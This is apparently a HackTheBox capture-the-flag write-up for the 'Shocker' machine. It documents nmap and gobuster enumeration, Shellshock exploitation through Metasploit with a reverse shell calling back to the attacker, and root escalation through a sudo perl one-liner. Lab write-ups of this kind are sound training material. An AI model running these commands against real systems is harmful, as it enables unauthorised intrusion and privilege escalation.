# Shocker

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine vulnerable to Shellshock (CVE-2014-6271), a critical 
bash vulnerability triggered via Apache CGI scripts. Exploitation 
grants access as shelly. Privilege escalation achieved via sudo 
permissions on perl.

---

## 1. Reconnaissance

Port scan using nmap:

```bashnmap -Pn -sCV -p- --top-ports 1000 -T3 10.10.10.56

**Open ports:**

| Port | Service |
|------|---------|
| 80 | HTTP Apache |
| 2222 | SSH |

---

## 2. Web Enumeration

Found cgi-bin directory and enumerated scripts:

```bashgobuster dir -u http://10.10.10.56/cgi-bin/ 
-w /usr/share/wordlists/dirb/common.txt 
-x sh,cgi,pl,php

Found script: `user.sh`

Accessing `http://10.10.10.56/cgi-bin/user.sh` returns output 
matching the Linux `uptime` command.

---

## 3. Shellshock Exploitation

Exploited CVE-2014-6271 (Shellshock) using Metasploit:

```bashmsfconsole
search CVE-2014-6271
use 0
set payload cmd/unix/reverse_openssl
set LHOST tun0
set RHOST 10.10.10.56
run

Received shell as **shelly**.

---

## 4. User Flag

```bashcat /home/shelly/user.txt

---

## 5. Privilege Escalation

Checked sudo permissions:

```bashsudo -l
(root) NOPASSWD: /usr/bin/perl

Spawned root shell via perl:

```bashsudo /usr/bin/perl -e 'exec "/bin/sh"'
whoami
root

Retrieved root flag:

```bashcat /root/root.txt

---

## 6. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Gobuster | CGI script enumeration |
| Metasploit | Shellshock exploitation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| Shellshock CVE-2014-6271 | RCE via bash CGI script |
| sudo Misconfiguration | perl allowed as root via sudo |
